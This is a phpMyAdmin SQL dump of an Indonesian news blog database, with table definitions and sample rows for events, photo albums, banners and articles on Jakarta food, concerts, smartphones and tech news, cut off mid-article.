-- phpMyAdmin SQL Dump
-- version 4.9.5
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Waktu pembuatan: 14 Agu 2020 pada 12.56
-- Versi server: 10.3.23-MariaDB
-- Versi PHP: 7.3.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `multijakarta_blog`
--

-- --------------------------------------------------------

--
-- Struktur dari tabel `agenda`
--

CREATE TABLE `agenda` (
  `id_agenda` int(5) NOT NULL,
  `tema` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `tema_seo` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `isi_agenda` text COLLATE latin1_general_ci NOT NULL,
  `tempat` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `pengirim` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `gambar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `tgl_mulai` date NOT NULL,
  `tgl_selesai` date NOT NULL,
  `tgl_posting` date NOT NULL,
  `jam` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `dibaca` int(5) NOT NULL DEFAULT 1,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `agenda`
--

INSERT INTO `agenda` (`id_agenda`, `tema`, `tema_seo`, `isi_agenda`, `tempat`, `pengirim`, `gambar`, `tgl_mulai`, `tgl_selesai`, `tgl_posting`, `jam`, `dibaca`, `username`) VALUES
(64, 'Elton John Greatest Hits Tour', 'elton-john-greatest-hits-tour', '<p>November ini,&nbsp; Indonesia akan disuguhkan salah satu konser megah dari legenda musik dunia yaitu Elton John. Penampilan Elton John yang pertama kalinya di Indonesia akan berlangsung pada 17 November 2012, di&nbsp; Sentul International Convention Center, Bogor yang lokasinya tidak begitu jauh dari Jakarta.<br />\r\n<br />\r\nKonser Elton John ini merupakan bagian dari tur dunianya yang bertajuk &ldquo;Greatest Hits Tour&rdquo; dan akan dimulai pada awal November dari Latvia sampai ke Australia. Elton John akan membawa band lamanya yang terdiri dari Davey Johnstone, Nigel Olsson, Robert Birch, Kim Bullard dan John Mahon, dan empat backing vocal yaitu Rose&nbsp; Batu (Sly dan The Family Stone), Lisa Bank, Tata Vega, dan Jean Witherspoon.</p>\r\n', 'Sentul International Convention Center', 'Robby Prihandaya', '', '2012-11-17', '2012-11-17', '2012-08-20', '02:00:00 - 13:30:00', 93, 'admin'),
(62, 'Maroon Live in Jakarta 2012', 'maroon-live-in-jakarta-2012', 'Maroon 5 akan kembali menghibur penggemar Jakarta mereka dengan sebuah konser pada 5 Oktober 2012 di Istora Senayan, Jakarta. Ini akan menjadi penampilan kedua mereka di tanah air setelah tampil pada konser sold out 27 April 2011 lalu. Grup musik beraliran pop rock yang berasal dari Los Angeles, California Amerika Serikat. Rencananya menggelar konsernya pada 5 Oktober 2012, di Istora Senayan, Jakarta. Java Musikindo selaku promotor telah mengumumkan pembagian kelas serta harga tiket konser. Band yang digawangi oleh Adam Levine (vokal/gitar), Jesse Carmichael (keyboard/gitar),Mickey Madden (bass), James Valentine (gitar), Matt Flynn (drum) ini menggelar konser di Jakarta sebagai bagian dari promo album barunya, Overexposed, yang dirilis Juni lalu.\r\n', 'Istora Senayan Jakarta', 'Muhammad Arsenio', '', '2012-10-05', '2012-10-05', '2012-08-19', '20:00:00 - Selesai', 27, 'admin'),
(63, 'Festival Musik Bambu Nusa', 'festival-musik-bambu-nusantara-2012', 'Bambu Nusantara ke-6 tahun ini akan digelar di Jakarta Convention Center (JCC), di Jalan Jenderal Gatot Subroto, Jakarta, pada 1 - 2 September 2012. Acara tersebut akan menghadirkan beraneka kreasi berbahan bambu dan tampilnya beragam seni dari bambu. Selain suguhan musik etnik berpadu dengan musik modern, dalam Acara ini juga akan turut diisi dengan pameran, seminar, merchandise, kuliner, dan fashion yang dipadu padankan dengan karya berbahan bambu.<br />\r\n', 'Jakarta Convention Center (JCC), Jakarta', 'Dewiit Safitri', '', '2012-09-01', '2012-09-02', '2012-08-20', '09:00:00 - 21:00:00', 44, 'admin');

-- --------------------------------------------------------

--
-- Struktur dari tabel `album`
--

CREATE TABLE `album` (
  `id_album` int(5) NOT NULL,
  `jdl_album` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `album_seo` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `keterangan` text COLLATE latin1_general_ci NOT NULL,
  `gbr_album` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `aktif` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'Y',
  `hits_album` int(5) NOT NULL DEFAULT 1,
  `tgl_posting` date NOT NULL,
  `jam` time NOT NULL,
  `hari` varchar(20) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `album`
--

INSERT INTO `album` (`id_album`, `jdl_album`, `album_seo`, `keterangan`, `gbr_album`, `aktif`, `hits_album`, `tgl_posting`, `jam`, `hari`, `username`) VALUES
(30, 'Konser Kantata Barock 2018 berlangsung Dramatis', 'konser-kantata-barock-2018-berlangsung-dramatis', '<p>Para macan tua yang digawangi Iwan Fals, Setiawan Djody dan Sawung Jabo di Stadion Gelora Bung Karno, Jakarta, Jumat (30/12) malam. Kantata kembali membawakan lagu-lagu legendarisnya setelah 21 tahun vakum dari dunia musik.</p>\r\n\r\n<div style=\"background-color:#ffffff; border:medium none; color:#000000; overflow:hidden; text-align:left; text-decoration:none\">&nbsp;</div>\r\n', 'konser.png', 'Y', 57, '2012-08-20', '09:12:06', 'Senin', 'admin'),
(31, 'Asunt in anim uis aute irure dolor in reprehenderit', 'asunt-in-anim-uis-aute-irure-dolor-in-reprehenderit', '<p>Asunt in anim uis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in anim id est laborum. Allamco laboris nisi ut aliquip ex ea commodo consequat. Aser velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in anim id est laborum.</p>\r\n', 'maxresdefault.jpg', 'Y', 16, '2012-08-20', '09:40:01', 'Senin', 'admin'),
(28, 'Murah Meriah belanja puas di Pasar Asemka', 'murah-meriah-belanja-puas-di-pasar-asemka', '<p>Pasar Asemka, Jakarta, merupakan pasar grosir yang banyak menyediakan berbagai aksesoris seperti kalung, cincin, Souvenir pernakahan, dan lainnya. Di Pasara Asemka anda akan dimanjakan dengan beragam barang yang dibandrol dengan harga murah meriah dan biasanya dijual grosiran.</p>\r\n', 'Murah-Meriah.jpg', 'Y', 79, '2012-08-18', '23:14:05', 'Sabtu', 'admin'),
(29, 'Karpet Raksasa dari Bunga mendapatkan rekor muri', 'karpet-raksasa-dari-bunga-mendapatkan-rekor-muri', '<p>Belgia sedang memperingati peristiwa tahunan &quot;La Fete De La Fleur&quot; atau pesta bunga di bulan Agustus. Ahli bunga merancang karpet raksasa dari bunga di depan Grand Place di Brussel. Karpet ini dibuat menggunakan 700 ribu bunga.</p>\r\n', 'karpet.jpg', 'Y', 138, '2012-08-19', '03:02:27', 'Minggu', 'admin'),
(51, 'Jalan-jalan bersama pemenang quiz online swarakalibata', 'jalanjalan-bersama-pemenang-quiz-online-swarakalibata', '<p>Israel pekan-pekan belakangan ini meningkatkan ancaman-ancamannya untuk menghancurkan fasilitas-fasilitas nuklir Iran guna mencegah Teheran mampu memproduksi senjata-senjata atom. Iran yang terkena sanksi-sanksi Barat membantah tuduhan itu dan menegaskan bahwa program nuklirnya hanya untuk tujuan damai. Militernya memperingatkan akan menghancurkan Israel jika diserang.</p>\r\n', 'quiz.jpg', 'Y', 10, '2018-04-21', '22:55:11', 'Sabtu', 'admin');

-- --------------------------------------------------------

--
-- Struktur dari tabel `background`
--

CREATE TABLE `background` (
  `id_background` int(5) NOT NULL,
  `gambar` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `background`
--

INSERT INTO `background` (`id_background`, `gambar`) VALUES
(1, 'blue');

-- --------------------------------------------------------

--
-- Struktur dari tabel `banner`
--

CREATE TABLE `banner` (
  `id_banner` int(5) NOT NULL,
  `judul` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `url` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `gambar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `tgl_posting` date NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `banner`
--

INSERT INTO `banner` (`id_banner`, `judul`, `url`, `gambar`, `tgl_posting`) VALUES
(19, 'Belajar Islam menjadi lebih mudah', 'https://mstore.co.id/', '', '2020-07-06'),
(20, 'Kursus Web Programming Online', 'https://mstore.co.id/', '', '2020-07-06'),
(21, 'Pro dan Kontra Fenomena Viral di Dunia Maya', 'https://mstore.co.id/', '', '2020-07-06'),
(22, 'Memurnikan Aqidah Menebarkan Sunnah', 'https://mstore.co.id/', '', '2020-07-06'),
(23, 'Media Salafiyyah Ahlus Sunnah', 'https://mstore.co.id/', '', '2020-07-06');

-- --------------------------------------------------------

--
-- Struktur dari tabel `berita`
--

CREATE TABLE `berita` (
  `id_berita` int(5) NOT NULL,
  `id_kategori` int(5) NOT NULL,
  `username` varchar(30) COLLATE latin1_general_ci NOT NULL,
  `judul` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `sub_judul` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `youtube` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `judul_seo` text CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `headline` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'Y',
  `aktif` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'N',
  `utama` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'Y',
  `isi_berita` longtext CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `keterangan_gambar` text COLLATE latin1_general_ci NOT NULL,
  `hari` varchar(20) COLLATE latin1_general_ci NOT NULL,
  `tanggal` date NOT NULL,
  `jam` time NOT NULL,
  `gambar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `dibaca` int(5) NOT NULL DEFAULT 1,
  `tag` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `status` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'Y'
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `berita`
--

INSERT INTO `berita` (`id_berita`, `id_kategori`, `username`, `judul`, `sub_judul`, `youtube`, `judul_seo`, `headline`, `aktif`, `utama`, `isi_berita`, `keterangan_gambar`, `hari`, `tanggal`, `jam`, `gambar`, `dibaca`, `tag`, `status`) VALUES
(601, 40, 'admin', 'Es Teler, Sejarahmu Dulu dan Kini bagaimana cerita', '', '', 'es-teler-sejarahmu-dulu-dan-kini-bagaimana-cerita', 'N', 'N', 'N', '<p>Es Teler adalah minuman es berisi potongan buah alpukat, kelapa muda, nangka matang, dan santan kelapa encer dengan pemanis berupa sirup. Es yang dipakai bisa berupa es serut atau es batu.<br />\r\n<br />\r\nVariasi lain es teler berisi cincau, kolang-kaling, dan pacar china, potongan buah apel, pepaya, sawo, melon, roti, dan agar-agar, hingga es teler menjadi sulit dibedakan dengan es campur.<br />\r\n<br />\r\nEs Teler adalah jenis Kuliner yang murni &quot;Fresh from Nature&quot;, Tanpa diolah, hanya dipotong dan dibersihkan, lalu di beri kuah rasa sesuai selera dan di minum/makan dingin. Sehingga kandungan Gizi yang terdapat dalam buah yang dipakai otomatis masih baik. Es Teler --&gt; recomended deh sebagai makanan penutup dibanding makanan penutup olahan.<br />\r\n<br />\r\n<strong>Sejarah Es Teler</strong><br />\r\n<br />\r\nEs teler diciptakan Tukiman Darmowijono, pedagang es campur dengan gerobak di Jalan Semarang Jakarta Pusat pada tahun 1980-an. Es campur kreasi Tukiman begitu enak sehingga anak-anak muda yang meminumnya mengaku keenakan seperti &quot;teler&quot; akibat mengkonsumsi narkoba. Es kelapa muda bercampur alpukat yang dijual Tukiman di Jalan Semarang kemudian dikenal sebagai &quot;es teler.&quot;<br />\r\n<br />\r\nKepopuleran es yang bikin teler makin mencuat berkat promosi dari mulut ke mulut dan liputan media massa. Pembeli yang datang bermobil menimbulkan antrian parkir mobil yang dirasakan penduduk Jalan Semarang dan sekitarnya sebagai pengganggu ketenangan. Es teler Tukiman harus pindah ke Jalan Pegangsaan Barat dan kemudian ke dalam kompleks bioskop Megaria. Kedai es teler Tukiman di kompleks bioskop Megaria sekarang bernama kedai ayam bakar dan es teler Sari Mulia Asli.<br />\r\n<br />\r\nWaralaba nasional Es Teler 77 Juara Indonesia didirikan Sukyatno Nugroho, setelah sang mertua bernama Ny Murniati Widjaja menjuarai lomba es teler nasional di tahun 1982. Gerai Es Teler 77 yang pertama terdapat di pertokoan Duta Merlin, Harmoni, Jakarta Pusat. Di gerai Es Teler 77 juga tersedia berbagai makanan pendamping seperti mi bakso dan nasi goreng. Di luar negeri, gerai Es Teler 77 terdapat di Australia, Malaysia, dan Singapura.</p>\r\n', '', 'Minggu', '2018-04-22', '07:56:41', 'es-teler.jpg', 42, '', 'Y'),
(598, 40, 'admin', 'Laksa Betawi yang Menggugah Selera international', '', '', 'laksa-betawi-yang-menggugah-selera-international', 'N', 'N', 'N', '<p>Makanan khas betawi yang satu ini memang sudah agak jarang bisa ditemui. Namun bukan berarti punah. Di beberapa lokasi tertentu, anda masih bisa menemukan Laksa betawi. Bagi anda yang belum mengetahui apa itu Laksa Betawi, Laksa betawi adalah Penganan berjenis mie yang diberi bumbu. Laksa Betawi memiliki kuah berwarna kekuningan. Campuran udang rebon yang ada dalam kuah laksa, membuat rasanya menjadi segar dan di padu aroma khas udang.<br />\r\n<br />\r\nSelain itu, Makanan ini menggunakan Ketupat. Isi dari ketupat laksa betawi adalah irisan ketupat, telur, kemangi, tauge. kucai, bihun, perkedel, dan bawang goreng, serta kuahnya yang kental dengan taburan udang kering. Namun ada yang bilang bahwa Bihun dan perkedel hanya variasi tambahan dari laksa, bukan bawaan asli nya.<br />\r\n<br />\r\nCara lain untuk menikmati Laksa adalah menggunakan Semur betawi. Paduan rasa manis pada semur, tentu nya akan menambah rasa gurih di lidah. Namun hal ini bukan suatu keharusan. Tergantung selera masing-masing.<br />\r\n<br />\r\nCara mengolah Laksa Betawi<br />\r\n<br />\r\nMengolah laksa betawi susah-susah gampang. Bumbunya sederhana, terdiri dari kunyit, lengkuas, sereh, daun salam, daun jeruk, jahe, jintan, lada, temu kunci, serta dua kilogram udang rebon. Semua bumbu dihaluskan dengan lumpang lalu ditumis dan dicampur dengan santan cair.<br />\r\n<br />\r\nBumbu baru ditambahkan dengan santan kental. Proses ini dilakukan sampai tiga kali. Sejak dahulu hingga sekarang. Dengan proses yang agak rumit, tidak aneh kalau makanan ini jadi agak langka. Orang maunya langsung jadi tanpa memikirkan cara pembuatannya.<br />\r\n&nbsp;</p>\r\n', '', 'Kamis', '2012-10-25', '02:13:20', '', 8, '', 'Y'),
(599, 44, 'admin', 'Semur, Aslinya dari Belanda atau tidak dari belanda?', '', '', 'semur-aslinya-dari-belanda-atau-tidak-dari-belanda', 'N', 'N', 'N', '<p>Jangan merasa tidak terima jika dikatakan bahwa semur adalah hidangan Belanda. Sebab, di balik semur memang ada riwayat nusantara, bukti bagaimana silang budaya terjadi antara Indonesia dan Eropa, demikian menurut ahli kajian budaya Dr phil Lily Tjahjandari.<br />\r\n<br />\r\nPercaya tidak, Indonesia ternyata sudah meramu berbagai makanan dengan berbagai jenis rempah sejak abad pertama. Hal ini terjadi karena posisi Indonesia terletak di tengah jalur perdagangan dunia.<br />\r\n<br />\r\nKekayaan rempah Indonesia ini lalu mengundang berbagai bangsa untuk datang dan mengeksplorasi citarasa rempah. Diawali dengan kedatangan pedagang India pada abad 1-7, dan diikuti oleh pedagang China dan Arab. Perdagangan rempah kemudian membuka jalan ekspansi masif bangsa Eropa pada abad 16-19. Mereka menjelajah wilayah Indonesia untuk menemukan rempah-rempah, dan memulai terjadinya interaksi budaya kuliner antara Eropa dan Indonesia.<br />\r\n<br />\r\n&quot;Sebelumnya, penguat rasa makanan Eropa hanya terbatas pada tomat, ceri, bawang bombai, madu, atau wine,&quot; ungkap Lily, yang juga Manajer Penelitian dan Pengabdian Masyarakat Fakultas Ilmu Pengetahuan Budaya Universitas Indonesia. Orang Eropa lalu mendapatkan inspirasi untuk menggunakan berbagai rempah Asia untuk mengolah makanan Eropa.<br />\r\n<br />\r\nNah, ketika keahlian meramu bumbu khas Indonesia seperti lada, kayu manis, jahe, kemiri, cengkeh itu berpadu dengan teknik memasak bangsa Eropa, hadirlah hidangan unik seperti semur. Semur sendiri asalnya dari bahasa Belanda, smoor, yang artinya masakan daging yang direbus dengan tomat dan bawang secara perlahan.<br />\r\n<br />\r\n&quot;Ketika itu, orang Eropa yang bisa memasak dengan rempah-rempah dianggap sebagai kalangan aristokrat. Hidangan semur ini diterima dengan baik oleh lidah kaum priyayi Belanda, dan menjadi menu rijsttafel,&quot; kata Lily, saat talkshow bertema &quot;Semur, Turun-Temurun Menghangatkan Hati Keluarga Indonesia&quot; di Restoran Warung Daun, Kebayoran Baru, Jakarta Selatan, beberapa waktu lalu.<br />\r\n<br />\r\nRijstaffel merupakan konsep penyajian makanan lengkap ala restoran di Eropa, yang diawali dengan hidangan pembuka, hidangan utama, dan hidangan penutup. Namun hidangan yang disajikan bukan hidangan Eropa, melainkan menu Indonesia dimana nasi sebagai makanan utama dinikmati dengan lauk-pauk.<br />\r\n<br />\r\nSebenarnya, semur itu sendiri bukan makanan asli Belanda. Semur, menurut pakar kuliner Chef Ragil Imam Wibowo, merupakan persepsi bangsa Indonesia dari hidangan tradisional Belanda yang bernama hachee. Hachee merupakan hidangan daging rebus yang dipotong-potong, kadang-kadang juga menggunakan ikan, burung, dan sayuran. Bumbu dasarnya adalah bawang dan rasa asam (biasanya didapat dari cuka atau wine). Cengkeh dan daun salam lalu ditambahkan ke dalam kuah kaldunya yang kental.<br />\r\n<br />\r\nHachee kelak menjadi trigger untuk hidangan semur. Dalam versi Indonesia, semur ini menggunakan bumbu bawang merah, bawang putih, dengan tambahan berbagai rempah lain untuk menguatkan rasa, seperti ketumbar, pala, lada, cengkeh, dan kayu manis. Semur lalu menjadi istimewa karena menggunakan kecap sebagai penguat rasa manis yang legit, dan memberi warna coklat yang menggugah selera.<br />\r\n<br />\r\n&quot;Kecap itu idenya ketika orang Indonesia berimajinasi bagaimana membuat warna coklatnya. Pada hachee, warna coklat didapat dari brownstock, yaitu kaldu dari tulang sapi yang dibakar. Orang Indonesia lalu mencari, apa yang kira-kira bisa memberi warna dan rasa yang diinginkan,&quot; ujar Chef Ragil dalam acara yang sama.<br />\r\n<br />\r\nSemur kemudian melekat menjadi tradisi bangsa Indonesia., dan menjadi menu favorit setiap keluarga Indonesia. Menu ini hadir dengan inovasi bumbu dan topping yang beraneka ragam. Jika awalnya semur identik dengan daging sapi, Anda bisa menemukan semur daging kambing, ayam, telur, tahu, tempe, terong, dan bahkan ikan. Dan semuanya lezat!<br />\r\n<br />\r\n&nbsp;</p>\r\n', '', 'Minggu', '2012-11-11', '02:17:45', '', 7, '', 'Y'),
(608, 19, 'admin', 'Vivo X50 Series Bisa Dipesan di Indonesia Mulai Hari Ini', '', 'https://www.youtube.com/watch?v=Vw-IQItJtUg', 'vivo-x50-series-bisa-dipesan-di-indonesia-mulai-hari-ini', 'N', 'N', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Vivo tengah bersiap untuk meluncurkan ponsel flagship perdananya di Indonesia, yakni Vivo X50 series. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Smartphone flagship seri X teranyar Vivo ini dipastikan bakal hadir dalam dua model, yakni X50 dan X50 Pro. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski tanggal peresmiannya masih belum diungkap, Vivo telah membuka keran blind pre-order X50 dan X50 Pro di Indonesia. Disebut blind pre-order karena Vivo memang belum mengungkap harga kedua ponsel tersebut. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sesi blind pre-order Vivo X50 series dimulai hari ini, Selasa (7/7/2020) pukul 10.00 WIB, di toko resmi Vivo di situs e-commerce Blibli.com dan akan berlangsung hingga 15 Juli. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Peminat Vivo X50 series diminta memberikan uang muka sebesar Rp 500.000. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sebagai pemesan&nbsp;blind pre-order, peminat Vivo X50 series bisa mendapatkan beragam keuntungan, seperti voucer Blibli senilai Rp 300.000 untuk pembelian Vivo X50, dan voucer Blibli senilai Rp 500.000 untuk pembelian Vivo X50 Pro.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Selain itu, ada pula bonus earphone nirkabel Vivo TWS Neo (untuk pembelian Vivo X50) dan Vivo TWS Neo &amp; Google Nest Mini 2 (untuk pembelian Vivo X50 Pro) senilai Rp 2 juta.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Nantinya, voucer yang didapatkan ini bisa dipakai dalam sesi pemesanan (pre-order) Vivo X50 series di kemudian hari. Konsumen juga bakal mendapatkan diskon serta beragam hadiah yang dijanjikan, baik untuk pembelian Vivo X50 maupun X50 Pro. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Tertarik? Peminat Vivo X50 series bisa mengunjungi tautan berikut untuk langsung berpartisipasi dalam sesi blind pre-order ini. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Informasi lebih lanjut tentang Vivo X50 series bisa dilihat di situs resmi Vivo Indonesia di <a href=\"https://www.vivo.com/id/activity/xseries\" target=\"_blank\">tautan berikut ini</a>.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Soal spesifikasi, X50 series dipastikan bakal mengusung sederet fitur yang belum pernah ada di seri smartphone Vivo sebelumnya, dengan penekanan di aspek fotografi. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Beberapa di antaranya teknologi kamera bergimbal (Gimbal Stabilization), 60x Hyper Zoom, Pro Sport Mode, dan Pro Quad Camera. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Senior Brand Director Vivo Indonesia Edy Kusuma&nbsp;mengatakan, Vivo X50 memiliki desain yang elegan serta deretan inovasi teknologi yang belum pernah ada pada rangkaian smartphone Vivo sebelumnya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Kami percaya diri bahwa produk premium ini akan disambut hangat oleh konsumen setia Vivo di Indonesia,” ujar Edy Kusuma dalam keterangan tertulis yang diterima KompasTekno, Selasa (7/7/2020). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Vivo Indonesia sendiri belum mengungkap spesifikasi X50 dan X50 Pro. Dari segi desain, Vivo Indonesia mengonfirmasi bahwa X50 series bakal dibalut dengan desain smartphone kekinian.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Vivo X50 Series Bisa Dipesan di Indonesia Mulai Hari Ini Buruan!', 'Senin', '2020-07-07', '14:00:01', 'vivo_x50_series_mstore_indonesia.jpg', 10, 'internasional', 'Y'),
(611, 21, 'admin', 'Duel Swiss di Semifinal Cincinnati Masters', 'Tenis Cincinnati Masters 2012', '', 'duel-swiss-di-semifinal-cincinnati-masters', 'N', 'N', 'N', 'Cincinnati - Dua petenis asal Swiss berhasil mengempaskan lawan-lawannya dan akan bertemu di semifinal Cincinnati Masters. Stanislas Wawrinka sukses membungkam petenis Kanada, Milos Raonic, sementara Roger Federer berhasil menumbangkan Mardy Fish.<br />\r\n&nbsp;<br />\r\nWawrinka mengalahkan Raonic dengan pertarungan sengit. Bahkan sebelumnya, petenis 27 tahun tersebut sempat tertinggal di set pertama. Pada set awal tersebut, Wawrinka takluk 2-6.<br />\r\n&nbsp;<br />\r\nNamun pada set kedua, Wawrinka mampu mengendalikan permainan, dia mampu mengembalikan dengan baik pukulan keras dari Raonic. Hingga akhirnya sukses merebut set kedua ini dengan skor 7-6.<br />\r\n&nbsp;<br />\r\nSetelah berhasil menyamakan keadaan, Wawrinka terus mendominasi dan mengakhiri perlawanan Raonic dengan skor akhir di set ketiga 6-4. &ldquo;Saya bermain hebat setelah menjalani dua bulan yang menyulitkan,&rdquo; ujar Wawrinka, seperti disitat Yahoo Sports, Sabtu (18/8/2012).<br />\r\n&nbsp;<br />\r\nNantinya di babak semifinal, Wawrinka bakal menghadapi rekan senegaranya, Federer yang menghentikan langkah Fish dengan skor 6-3 7-6. Dengan gugurnya Fish atas Federer, maka tak ada satu pun petenis Amerika yang berpeluang menjadi juara di kandang sendiri.<br />\r\n', 'Stanislas Wawrinka.\r\n', 'Minggu', '2012-08-19', '05:22:25', '', 26, 'olahraga', 'Y'),
(612, 36, 'admin', 'Google Pakai Motorola untuk Gugat Apple', '', '', 'google-pakai-motorola-untuk-gugat-apple', 'N', 'N', 'N', '<p>Jakarta - Perang gugatan antara para produsen smartphone belum menunjukkan tanda berakhir. Yang terbaru, Motorola menuding Apple melanggar tujuh patennya.<br />\r\n<br />\r\nVendor ponsel yang diakuisisi Google pun meminta pihak berwewenang untuk memblokir impor iPhone, iPad dan komputer Mac. Perangkat-perangkat tersebut diminta dilarang beredar di Amerika Serikat.<br />\r\n<br />\r\nKomplain Motorola didaftarkan ke lembaga International Trade Comission (ITC). Paten yang dipermasalahkan terkait location reminders, notifikasi email, pemutar video dan sebagainya.<br />\r\n<br />\r\n&quot;Kami ingin menyelesaikan persoalan paten tersebut, namun ketidakmauan Apple untuk melisensinya membuat kami tidak punya pilihan selain mempertahankan inovasi kami,&quot; demikian pernyataan Motorola yang TerasJakarta kutip dari DigitalTrends, Minggu (19/8/2012).<br />\r\n<br />\r\nHal ini dinilai sebagai perang antara Google dan Apple, dengan Google menggunakan paten Motorola untuk menyerang Apple. Terlebih lagi, Apple banyak memperkarakan vendor Android seperti Samsung dan juga Motorola sendiri.</p>\r\n', '', 'Senin', '2012-08-20', '04:49:48', '', 6, 'teknologi', 'Y'),
(614, 22, 'admin', 'Zuckerberg akan Berhenti Pimpin Facebook?', 'Buntut Anjloknya di Bursa Saham', '', 'zuckerberg-akan-berhenti-pimpin-facebook', 'N', 'N', 'Y', '<p>Jakarta - Harga saham Facebook terus terjun bebas. Rekor harga terendah terjadi baru-baru ini senilai USD 19,06 dari harga awalnya USD 38. Buruknya performa saham Facebook ini memunculkan spekulasi bahwa Mark Zuckerberg tidak seharusnya terus memimpin Facebook sebagai CEO.<br />\r\n<br />\r\nSeorang analis industri menilai bahwa Zuckerberg yang dikenal dengan dandanan kasualnya bisa fokus pada urusan teknologi di Facebook. Sedangkan bisnis Facebook dipegang oleh orang yang benar-benar kompeten.<br />\r\n<br />\r\n&quot;Saya pikir ada rasa kurang percaya terhadap kemampuannya untuk menjalankan korporasi,&quot; kata Andre Stoltman, pengacara sekuritas di New York yang TerasJakarta kutip dari ComputerWorld, Minggu (19/8/2012).<br />\r\n<br />\r\n&quot;Zuckerberg, dipandang dari sisi manapun memang adalah orang yang jenius. Akan tetapi Anda seharusnya memiliki chief executive yang dewasa dan lebih berpengalaman dalam menjalankan perusahaan tersebut,&quot; imbuhnya.<br />\r\n<br />\r\nNamun demikian, Zuckerberg tetap punya dukungan untuk terus memimpin Facebook. Patrik Moorhead, analis di Moor Insights &amp; Strategy, menyatakan masih terlalu awal untuk membicarakan kemungkinan pergantian CEO Facebook.<br />\r\n<br />\r\n&quot;Dia telah menyediakan visi yang diperlukan Facebook untuk menjadi sebesar sekarang dan mereka tetap akan membutuhkan dia sebagai pemandu. Zuckerberg harus tetap ada di posisi top sekarang,&quot; kata Patrik.<br />\r\n<br />\r\nKarten Weide selaku analis di IDC menyatakan pula bahwa Zuckerberg tidak akan memberi kesempatan pada orang lain untuk memimpin perusahaan yang didirikannya itu.<br />\r\n<br />\r\n&quot;Mark Zuckerberg tidak akan lengser dalam waktu dekat. Dia adalah pria dalam sebuah misi, yaitu ingin memaksa dunia, jika perlu, agar lebih terbuka. Dan sebagai pria dalam sebuah misi, dia tidak mengutamakan soal 